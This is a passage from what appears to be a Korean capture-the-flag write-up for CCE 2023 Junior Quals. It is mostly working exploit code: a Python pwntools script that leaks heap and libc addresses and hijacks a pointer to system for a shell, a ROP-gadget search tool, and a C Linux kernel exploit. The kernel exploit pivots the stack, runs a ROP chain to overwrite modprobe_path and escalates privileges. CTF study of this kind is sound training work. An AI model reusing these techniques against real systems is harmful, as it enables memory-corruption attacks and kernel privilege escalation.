    unk_29360 = [94, 64, 0, 94, 65, 0, 94, 66, 0, 94, 67, 0, 94, 68, 0, 94, 69, 0, 94, 70, 0, 94, 71, 0, 94, 72, 0, 94, 73, 0, 94, 74, 0, 94, 75, 0, 94, 76, 0, 94, 77, 0, 94, 78, 0, 94, 79, 0, 94, 80, 0, 94, 81, 0, 94, 82, 0, 94, 83, 0, 94, 84, 0, 94, 85, 0, 94, 86, 0, 94, 87, 0, 94, 88, 0, 94, 89, 0, 94, 90, 0, 94, 91, 0, 94, 92, 0, 94, 93, 0, 94, 94, 0, 94, 95, 0, 32, 0, 33, 0, 34, 0, 35, 0, 36, 0, 37, 0, 38, 0, 39, 0, 40, 0, 41, 0, 42, 0, 43, 0, 44, 0, 45, 0, 46, 0, 47, 0, 48, 0, 49, 0, 50, 0, 51, 0, 52, 0, 53, 0, 54, 0, 55, 0, 56, 0, 57, 0, 58, 0, 59, 0, 60, 0, 61, 0, 62, 0, 63, 0, 64, 0, 65, 0, 66, 0, 67, 0, 68, 0, 69, 0, 70, 0, 71, 0, 72, 0, 73, 0, 74, 0, 75, 0, 76, 0, 77, 0, 78, 0, 79, 0, 80, 0, 81, 0, 82, 0, 83, 0, 84, 0, 85, 0, 86, 0, 87, 0, 88, 0, 89, 0, 90, 0, 91, 0, 92, 0, 93, 0, 94, 0, 95, 0, 96, 0, 97, 0, 98, 0, 99, 0, 100, 0, 101, 0, 102, 0, 103, 0, 104, 0, 105, 0, 106, 0, 107, 0, 108, 0, 109, 0, 110, 0, 111, 0, 112, 0, 113, 0, 114, 0, 115, 0, 116, 0, 117, 0, 118, 0, 119, 0, 120, 0, 121, 0, 122, 0, 123, 0, 124, 0, 125, 0, 126, 0, 94, 63, 0, 126, 64, 0, 126, 65, 0, 126, 66, 0, 126, 67, 0, 126, 68, 0, 126, 69, 0, 126, 70, 0, 126, 71, 0, 126, 72, 0, 126, 73, 0, 126, 74, 0, 126, 75, 0, 126, 76, 0, 126, 77, 0, 126, 78, 0, 126, 79, 0, 126, 80, 0, 126, 81, 0, 126, 82, 0, 126, 83, 0, 126, 84, 0, 126, 85, 0, 126, 86, 0, 126, 87, 0, 126, 88, 0, 126, 89, 0, 126, 90, 0, 126, 91, 0, 126, 92, 0, 126, 93, 0, 126, 94, 0, 126, 95, 0, 77, 45, 32, 0, 77, 45, 33, 0, 77, 45, 34, 0, 77, 45, 35, 0, 77, 45, 36, 0, 77, 45, 37, 0, 77, 45, 38, 0, 77, 45, 39, 0, 77, 45, 40, 0, 77, 45, 41, 0, 77, 45, 42, 0, 77, 45, 43, 0, 77, 45, 44, 0, 77, 45, 45, 0, 77, 45, 46, 0, 77, 45, 47, 0, 77, 45, 48, 0, 77, 45, 49, 0, 77, 45, 50, 0, 77, 45, 51, 0, 77, 45, 52, 0, 77, 45, 53, 0, 77, 45, 54, 0, 77, 45, 55, 0, 77, 45, 56, 0, 77, 45, 57, 0, 77, 45, 58, 0, 77, 45, 59, 0, 77, 45, 60, 0, 77, 45, 61, 0, 77, 45, 62, 0, 77, 45, 63, 0, 77, 45, 64, 0, 77, 45, 65, 0, 77, 45, 66, 0, 77, 45, 67, 0, 77, 45, 68, 0, 77, 45, 69, 0, 77, 45, 70, 0, 77, 45, 71, 0, 77, 45, 72, 0, 77, 45, 73, 0, 77, 45, 74, 0, 77, 45, 75, 0, 77, 45, 76, 0, 77, 45, 77, 0, 77, 45, 78, 0, 77, 45, 79, 0, 77, 45, 80, 0, 77, 45, 81, 0, 77, 45, 82, 0, 77, 45, 83, 0, 77, 45, 84, 0, 77, 45, 85, 0, 77, 45, 86, 0, 77, 45, 87, 0, 77, 45, 88, 0, 77, 45, 89, 0, 77, 45, 90, 0, 77, 45, 91, 0, 77, 45, 92, 0, 77, 45, 93, 0, 77, 45, 94, 0, 77, 45, 95, 0, 77, 45, 96, 0, 77, 45, 97, 0, 77, 45, 98, 0, 77, 45, 99, 0, 77, 45, 100, 0, 77, 45, 101, 0, 77, 45, 102, 0, 77, 45, 103, 0, 77, 45, 104, 0, 77, 45, 105, 0, 77, 45, 106, 0, 77, 45, 107, 0, 77, 45, 108, 0, 77, 45, 109, 0, 77, 45, 110, 0, 77, 45, 111, 0, 77, 45, 112, 0, 77, 45, 113, 0, 77, 45, 114, 0, 77, 45, 115, 0, 77, 45, 116, 0, 77, 45, 117, 0, 77, 45, 118, 0, 77, 45, 119, 0, 77, 45, 120, 0, 77, 45, 121, 0, 77, 45, 122, 0, 77, 45, 123, 0, 77, 45, 124, 0, 77, 45, 125, 0, 77, 45, 126, 0, 126, 63, 0, 128, 0, 129, 0, 130, 0, 131, 0, 132, 0, 133, 0, 134, 0, 135, 0, 136, 0, 137, 0, 138, 0, 139, 0, 140, 0, 141, 0, 142, 0, 143, 0, 144, 0, 145, 0, 146, 0, 147, 0, 148, 0, 149, 0, 150, 0, 151, 0, 152, 0, 153, 0, 154, 0, 155, 0, 156, 0, 157, 0, 158, 0, 159, 0, 160, 0, 161, 0, 162, 0, 163, 0, 164, 0, 165, 0, 166, 0, 167, 0, 168, 0, 169, 0, 170, 0, 171, 0, 172, 0, 173, 0, 174, 0, 175, 0, 176, 0, 177, 0, 178, 0, 179, 0, 180, 0, 181, 0, 182, 0, 183, 0, 184, 0, 185, 0, 186, 0, 187, 0, 188, 0, 189, 0, 190, 0, 191, 0, 192, 0, 193, 0, 194, 0, 195, 0, 196, 0, 197, 0, 198, 0, 199, 0, 200, 0, 201, 0, 202, 0, 203, 0, 204, 0, 205, 0, 206, 0, 207, 0, 208, 0, 209, 0, 210, 0, 211, 0, 212, 0, 213, 0, 214, 0, 215, 0, 216, 0, 217, 0, 218, 0, 219, 0, 220, 0, 221, 0, 222, 0, 223, 0, 224, 0, 225, 0, 226, 0, 227, 0, 228, 0, 229, 0, 230, 0, 231, 0, 232, 0, 233, 0, 234, 0, 235, 0, 236, 0, 237, 0, 238, 0, 239, 0, 240, 0, 241, 0, 242, 0, 243, 0, 244, 0, 245, 0, 246, 0, 247, 0, 248, 0, 249, 0, 250, 0, 251, 0, 252, 0, 253, 0, 254, 0, 255, 0]
    word_29160 = [0, 0, 3, 0, 6, 0, 9, 0, 12, 0, 15, 0, 18, 0, 21, 0, 24, 0, 27, 0, 30, 0, 33, 0, 36, 0, 39, 0, 42, 0, 45, 0, 48, 0, 51, 0, 54, 0, 57, 0, 60, 0, 63, 0, 66, 0, 69, 0, 72, 0, 75, 0, 78, 0, 81, 0, 84, 0, 87, 0, 90, 0, 93, 0, 96, 0, 98, 0, 100, 0, 102, 0, 104, 0, 106, 0, 108, 0, 110, 0, 112, 0, 114, 0, 116, 0, 118, 0, 120, 0, 122, 0, 124, 0, 126, 0, 128, 0, 130, 0, 132, 0, 134, 0, 136, 0, 138, 0, 140, 0, 142, 0, 144, 0, 146, 0, 148, 0, 150, 0, 152, 0, 154, 0, 156, 0, 158, 0, 160, 0, 162, 0, 164, 0, 166, 0, 168, 0, 170, 0, 172, 0, 174, 0, 176, 0, 178, 0, 180, 0, 182, 0, 184, 0, 186, 0, 188, 0, 190, 0, 192, 0, 194, 0, 196, 0, 198, 0, 200, 0, 202, 0, 204, 0, 206, 0, 208, 0, 210, 0, 212, 0, 214, 0, 216, 0, 218, 0, 220, 0, 222, 0, 224, 0, 226, 0, 228, 0, 230, 0, 232, 0, 234, 0, 236, 0, 238, 0, 240, 0, 242, 0, 244, 0, 246, 0, 248, 0, 250, 0, 252, 0, 254, 0, 0, 1, 2, 1, 4, 1, 6, 1, 8, 1, 10, 1, 12, 1, 14, 1, 16, 1, 18, 1, 20, 1, 22, 1, 24, 1, 26, 1, 28, 1, 30, 1, 33, 1, 36, 1, 39, 1, 42, 1, 45, 1, 48, 1, 51, 1, 54, 1, 57, 1, 60, 1, 63, 1, 66, 1, 69, 1, 72, 1, 75, 1, 78, 1, 81, 1, 84, 1, 87, 1, 90, 1, 93, 1, 96, 1, 99, 1, 102, 1, 105, 1, 108, 1, 111, 1, 114, 1, 117, 1, 120, 1, 123, 1, 126, 1, 129, 1, 133, 1, 137, 1, 141, 1, 145, 1, 149, 1, 153, 1, 157, 1, 161, 1, 165, 1, 169, 1, 173, 1, 177, 1, 181, 1, 185, 1, 189, 1, 193, 1, 197, 1, 201, 1, 205, 1, 209, 1, 213, 1, 217, 1, 221, 1, 225, 1, 229, 1, 233, 1, 237, 1, 241, 1, 245, 1, 249, 1, 253, 1, 1, 2, 5, 2, 9, 2, 13, 2, 17, 2, 21, 2, 25, 2, 29, 2, 33, 2, 37, 2, 41, 2, 45, 2, 49, 2, 53, 2, 57, 2, 61, 2, 65, 2, 69, 2, 73, 2, 77, 2, 81, 2, 85, 2, 89, 2, 93, 2, 97, 2, 101, 2, 105, 2, 109, 2, 113, 2, 117, 2, 121, 2, 125, 2, 129, 2, 133, 2, 137, 2, 141, 2, 145, 2, 149, 2, 153, 2, 157, 2, 161, 2, 165, 2, 169, 2, 173, 2, 177, 2, 181, 2, 185, 2, 189, 2, 193, 2, 197, 2, 201, 2, 205, 2, 209, 2, 213, 2, 217, 2, 221, 2, 225, 2, 229, 2, 233, 2, 237, 2, 241, 2, 245, 2, 249, 2, 253, 2]
    for i in range(len(word_29160)//2):
        word_29160[i] = u16(bytes(word_29160[i*2:i*2+2]))
    word_29160 = word_29160[:len(word_29160)//2+1]
    for i in range(len(word_29780)//2):
        word_29780[i] = u16(bytes(word_29780[i*2:i*2+2]))
    word_29780 = word_29780[:len(word_29780)//2+1]
    
    if (x-0xa0)&0xffffffff <= 0x5f:
        v = []
        for i in range(4):
            if unk_29360[word_29780[x-0x80&0xffffffff]+i] == 0:
                break
            v.append(unk_29360[word_29780[x-0x80&0xffffffff]+i])
        return bytes(v)
    else:
        v = []
        for i in range(4):
            if unk_29360[word_29160[x]+i] == 0:
                break
            v.append((unk_29360[word_29160[x]+i]))
        return bytes(v)


def leak_bytes(raw_bytes : bytes, k : bytes, l : int) -> bytes:
    def parse(res, raw,l,idx,candidates):
        print(res)
        if len(res) > l:
            return None
        elif len(res) == l:
            return bytes(res)
        else:
            f = 0
            for i in range(0x0,0x20):
                if raw[idx+len(res):idx+len(res)+2] == unctrl_sp_emu(i):
                    res.append(i)
                    v = (parse(res,raw,l,idx+1,candidates))
                    f = 1
                    if v != None:
                        candidates.append(v)
                    res.pop()
            for i in range(0x20,0x7f):
                if p8(raw[idx+len(res)]) == unctrl_sp_emu(i):
                    res.append(i)
                    v = (parse(res,raw,l,idx,candidates))
                    f = 1
                    if v != None:
                        candidates.append(v)
                    res.pop()
            for i in range(0x7f,0xa0):
                if raw[idx+len(res):idx+len(res)+2] == unctrl_sp_emu(i):
                    res.append(i)
                    v = (parse(res,raw,l,idx+1,candidates))
                    f = 1
                    if v != None:
                        candidates.append(v)
                    res.pop()
            for i in range(0xa0,0x100):
                if (raw[idx+len(res)]) == (i):
                    res.append(i)
                    v = (parse(res,raw,l,idx,candidates))
                    f = 1
                    if v != None:
                        candidates.append(v)
                    res.pop()
            if f==0:
                return None
    candidates = []
    idx = raw_bytes.index(k)
    res = []
    parse(res, raw_bytes, l, idx+len(k),candidates)
    return candidates

# pwndbg> source ./addrsearch.py
# addr : 0x55ad1bc7f6c0
# target addr start: 0x7f12897b8000
# target addr end : 0x7f1289765000
# 
# 0x55ad1bc7f6c0 | 0x7f12897b9ce0 -- offset : -0xe720
# 0x55ad1bc7f6c8 | 0x7f12897b9cf0 -- offset : -0xe718
# 0x55ad1bc7f6d0 | 0x7f12897b9d00 -- offset : -0xe710
# 0x55ad1bc7f6d8 | 0x7f12897b9d10 -- offset : -0xe708
# 0x55ad1bc7f6e0 | 0x7f12897b9d20 -- offset : -0xe700
# 0x55ad1bc7f808 | 0x7f128978bb20 -- offset : -0xe5d8
# 0x55ad1bc7f8f0 | 0x7f12897c4b50 -- offset : -0xe4f0
# 0x55ad1bc7f8f8 | 0x7f12897b9d50 -- offset : -0xe4e8
# 0x55ad1bc800f8 | 0x7f1289765680 -- offset : -0xdce8
# 0x55ad1bc80168 | 0x7f12897615e0 -- offset : -0xdc78
# 0x55ad1bc80260 | 0x7f12897610a0 -- offset : -0xdb80
# 0x55ad1bc8e9b0 | 0x7f1289764cc0 -- offset : 0xbd0
# 0x55ad1bc8e9b8 | 0x7f1289764cc0 -- offset : 0xbd8
# 0x55ad1bc8e9b8 | 0x7f1289764cc0 -- offset : 0xbd8

if __name__ == '__main__':
    for i in range(5):
        print(solve(i+1))
    rvuntil(b'Result')
    s(b'\xe0')
    rv = rvuntil(b'1.')
    addr = leak_bytes(rv,b'1.  ',6)
    heap = 0
    for i in addr:
        v = u64(i + b'\x00'*2)
        if (v >> 8*5) == 0x55 or  (v >> 8*5) == 0x56:
            if heap == 0:
                heap = v
    assert(heap != 0)
    success("heap : " + hex(heap))
    s(b'y')
    for i in range(5):
        print(solve(i+1),'solved')
    rvuntil(b'Result')
    # constraint
    # addr-0x10+0x28 -> 0
    # 0x55ad1bc7f6d8 | 0x7f12897b9d10 -- offset : -0xe708
    s(b'A'*0x18 + p64(heap-0xe708-0x10))
    rv = rvuntil(b'3.  ')
    addr = (leak_bytes(rv,b'3.  ',6))
    libc_base = 0
    for i in addr:
        v = u64(i + b'\x00'*2)
        if (v >> 8*5) == 0x7f:
            if libc_base == 0:
                libc_base = v
    assert(libc_base != 0)
    libc_base -= 0x24bd10
    success("libc_base : " + hex(libc_base))
    s(b'y')
    for i in range(5):
        print(solve(i+1),'solved')
    rvuntil(b'Result')
    s(b'/bin/sh\x00' + b'A'*0x10 + p64(libc_base + 0x1f6080-0x10))
    s(b'n')
    sl(b'3')
    s(p64(libc_base + libc.sym.system))
    pause()
    p.interactive()

```
![](/blog/CCE_2023_Junior_Quals/image-1.png)
![](/blog/CCE_2023_Junior_Quals/image-2.png)

# babykernel
궁금해서 문제 파일을 받아서 풀어봤다.
## Analysis
### local_run.sh
```
#!/bin/sh
qemu-system-x86_64 \
    -m 128M \
    -cpu kvm64,+smep \
    -kernel bzImage \
    -initrd rootfs.img.gz \
    -snapshot \
    -nographic \
    -monitor /dev/null \
    -no-reboot \
    -append "console=ttyS0 kaslr kpti=1 quiet panic=1" \
    -s
```
smap가 안걸려있다.
### babykernel.ko
```c
  copy_from_user(&user_struct, args, 0x18LL);
  switch ( (_DWORD)cmd )
  {
    case 0x1002:
      v5 = (char *)&ops + 8 * *(&user_struct + 2);
      v6 = (_QWORD *)kmem_cache_alloc_trace(kmalloc_caches[18], 0x6000C0LL, 16LL);
      *v6 = v5;
      if ( (unsigned __int64)*(&user_struct + 1) > 0x10 )
        _copy_overflow(16LL, *(&user_struct + 1));
      else
        copy_to_user(user_struct, v6);
      break;
    case 0x1003:
      ((void (*)(void))((char *)&ops + 8 * *(&user_struct + 2)))();// relative ex
      break;
    case 0x1001:
      v4 = (_QWORD *)kmem_cache_alloc_trace(kmalloc_caches[18], 0x6000C0LL, 0x10LL);
      *v4 = &commit_creds;
      if ( (unsigned __int64)*(&user_struct + 1) <= 0x10 )
        copy_to_user(user_struct, v4);
      break;
  }
  return 1LL;
}
```
0x1002, 0x1001은 릭해주고, 0x1003은 ops에서 특정 오프셋만큼 떨어진 부분을 실행한다.
## Exploitation
ops쪽이랑 코드쪽 매핑을 릭하고 피보팅해주고 modprobe_path를 덮었다.
bzImage를 vmlinux로 추출하려했는데, 안되길래 직접 rop gadgets을  찾는 스크립트를 작성해서 가젯을 잘 가져왔다.
```python
import gdb
from capstone import *
from tqdm import tqdm
import pickle

default = "../res.rop"
def brief(x,keywords):
    m = 0x7ffffffff
    M = -1
    Ml = 0
    for i in keywords:
        if m > x.index(i):
            m = x.index(i)
        if M < x.index(i):
            M = x.index(i)
            Ml = len(i)
    if m == -1 or M == -1:
        return None
    s,S = 0,0
    if M+Ml+1 > len(x):
        S = 1
    if m-21 < 0:
        s = 1
    if s and not S:
        return x[:M+Ml+1]
    elif not s and S:
        i = m
        while True:
            if x[i] == '\n':
                i+=1
                break
            i-=1
        return x[i:]
    elif not s and not S:
        i = m
        while True:
            if x[i] == '\n':
                i+=1
                break
            i-=1
        return x[i:M+Ml+1]
    else:
        return x
    
def parse_int(v):
    if v.startswith("0x"):
        v = int(v,16)
    else:
        v = int(v,10)
    return v
def search(s,sv):
    if sv:
        print("save? (y/n) : ",end='')
        v = input() == 'y'
        if v: 
            with open(default,"wb") as f:
                pickle.dump(s, f)
            print("saved")
    print()
    print("Examples)\n\t1) array search :\n\t\tSearch > ['xchg','esp','ret']\n\t2) string search :\n\t\tSearch > xchg esp\n\t3) quit :\n\t\tSearch > q\n\t4) Save results :\n\t\tSearch > save")
    print()
    while True:
        print("Search > ",end='')
        v = input()
        if v == 'q':
            break
        elif v.startswith('['):
            print("limit : ",end='')
            limit = parse_int(input())
            arr = eval(v)
            res = []
            for i in s:
                f = 0
                cur = -1
                idx = []
                for j in arr:
                    if j not in i:
                        f = 1
                        break
                    else:
                        if cur < i.index(j):
                            idx.append(i.index(j))
                            cur = i.index(j)
                        else:
                            f = 1
                if f==0:
                    m = sum(idx) / len(idx)
                    M = 0
                    t = 0
                    for k in idx:
                        t = (m - k)**2
                        if M < t:
                            M = t
                    res.append([t,i])
            print("show brief (y/n) : ",end= '')
            v = input() == 'y'
            res.sort()
            if len(res) < limit:
                limit = len(res)
            for i in range(limit):
                if v:
                    print()
                    x= brief((res[i][1]),arr)
                    if x == None:
                        continue
                    print(x)
                else:
                    print()
                    print((res[i][1]))
        else:
            print("limit : ",end='')
            limit = parse_int(input())
            for i in s:
                if v in i:
                    print(i)

if __name__ == '__main__':
    print("load? (y/n) : ",end='')
    v = input() == 'y'
    if v:
        try:
            s = ''
            with open(default,'rb') as f:
                s = pickle.load(f)
            print("loaded successfully")
            search(s,False)
        except FileNotFoundError:
            print(f"'{default}' not found")
    else:
        inf = gdb.inferiors()[0]
        print("segment address : ",end='')
        addr = parse_int(input())
        res = gdb.execute(f"xinfo {addr}",to_string=True)
        if 'Containing mapping:' in res:
            res = res[res.index('0x')+2:]
            res = res[res.index('0x'):].split()
            print(f"reading memory {res[0]} ~ {res[1]} (0x{res[3]} bytes)")
            mem = (inf.read_memory(int(res[0],16),int(res[3],16))).tobytes()
            md = Cs(CS_ARCH_X86, CS_MODE_64)
            #gadgets = [b'\xc3',b"\xc2",b'\xcb',b"\xca",b'\xf2\xc3',b"\xf2\xc2",b'\xff',b'\xeb',b'\xe9',b'\xf2\xff',b'\xcd\x80',b"\x0f\x34",b"\x0f\x05",b'\x65\xff\x15\x10\x00\x00\x00']
            gadgets = [b'\xc3',b"\xc2",b'\xcb',b"\xca",b'\xff',b'\xeb',b'\xe9',b'\xf2',b'\xcd',b'\x0f',b'\x65',b'\x48'] # iretq
            candi = []
            print("finding gadgets")
            for i in tqdm(range(len(mem))):
                for k in gadgets:
                    if mem[i] == k[0] and i not in candi:
                        candi.append(i)
            s = []
            base = int(res[0],16)
            # print("width : ",end='')
            # v = parse_int(input())
            v = 0x20 # width 0x20 by default
            print("disassembling")
            for j in tqdm(range(len(candi))):
                tmp = ''
                if j-v < 0:
                    for i in md.disasm(mem[:candi[j]+v], base):
                        tmp += ("%s:\t%s %s\n" %('0x'+hex(i.address).replace('0x','').zfill(16) + ' (+'+ hex(i.address-base)+')', i.mnemonic, i.op_str))
                else:
                    for i in md.disasm(mem[candi[j]-v:candi[j]+v], base+candi[j]-v):
                        tmp += ("%s:\t%s %s\n" %('0x'+hex(i.address).replace('0x','').zfill(16) + ' (+'+ hex(i.address-base)+')', i.mnemonic, i.op_str))
                s.append(tmp)
            search(s,True)
        else:
            print("not mapped")
```
### Exploit script
```c
#include<sys/ioctl.h>
#include<stdio.h>
#include<stdlib.h>
#include<stdint.h>
#include<string.h>
#include<unistd.h>
#include<fcntl.h>
#include<sys/mman.h>

#define LEAK 0x1001
#define EXEC 0x1003
#define READ 0x1002
// -no-pie
struct ioinfo {
    uint8_t * buf;
    uint64_t size;
    uint64_t off;
};

uint64_t user_cs, user_rflags, user_ss,user_rsp;

void shell(void){
    system("echo '#!/bin/sh\nchmod 777 /flag' > /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/v");
    system("chmod +x /tmp/v");
    system("/tmp/v");

    system("cat /flag");
    exit(0);
}
void save_state(){
    __asm__ __volatile__ (
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "pushf;"
        "pop user_rflags;"
        "mov user_rsp, rsp;"
        "mov user_ss, ss;"
        ".att_syntax;"
    );
}

int main(){
    int fd = open("/dev/babykernel",O_RDONLY);
    if (fd == -1)
        return -1;
    struct ioinfo info;
    save_state();
    info.buf = (uint8_t *)malloc(0x10);
    info.size = 0x8;
    ioctl(fd, LEAK, &info);
    uint64_t commit_creds = *(uint64_t *)info.buf;
    info.off = 0x0;
    ioctl(fd, READ, &info);
    uint64_t ops = *(uint64_t *)info.buf;
    printf("commit_creds : 0x%lx\nops : 0x%lx\n",commit_creds,ops);
    free(info.buf);
    uint64_t base = commit_creds &0xfffffffffff00000;
    uint64_t xchg_esp = base + 0x605240;
    // pwndbg> x/10xi 0xffffffff89205240
    //    0xffffffff89205240:  xchg   esp,eax
    //    0xffffffff89205241:  ret
    info.off = (xchg_esp - ops) / 8;
    uint64_t * stack = mmap((void *)((xchg_esp & 0xffff0000)-0x5000), 0x10000,7,MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,-1,0);
    uint64_t * stack1 = mmap((void *)((xchg_esp & 0xffff0000)), 0x10000,7,MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,-1,0);
    // merge mem
    if (!stack)
        exit(-1);
    printf("fake_stack : %p\n",stack);
    uint64_t st = (xchg_esp & 0xffffffff);
    *((uint64_t *)(st + 0x00)) = base + 0x8197fd; 
    *((uint64_t *)(st + 0x08)) = base + 0x1a8b340; 
    *((uint64_t *)(st + 0x10)) = base + 0x44b12; 
    *((uint64_t *)(st + 0x18)) = ((xchg_esp & 0xffffffff) + 0x500); 
    *((uint64_t *)(st + 0x20)) = base + 0x1c4203; 
    *((uint64_t *)(st + 0x28)) = 0x1;
    *((uint64_t *)(st + 0x30)) = base + 0x72b6f7; // rep movsq qword ptr [rdi], qword ptr [rsi]
    *((uint64_t *)(st + 0x38)) = base + 0x1001144; 
    *((uint64_t *)(st + 0x40)) = 0x0;
    *((uint64_t *)(st + 0x48)) = 0x0;
    *((uint64_t *)(st + 0x50)) = (uint64_t)&shell;
    *((uint64_t *)(st + 0x58)) = user_cs;
    *((uint64_t *)(st + 0x60)) = user_rflags;
    *((uint64_t *)(st + 0x68)) = user_rsp;
    *((uint64_t *)(st + 0x70)) = user_ss;
    
    *(uint64_t *)((xchg_esp & 0xffffffff) + 0x500) = 0x782f706d742f;
    
    ioctl(fd, EXEC, &info);
    return 0;
}
```
![](/blog/CCE_2023_Junior_Quals/image-1-1.png)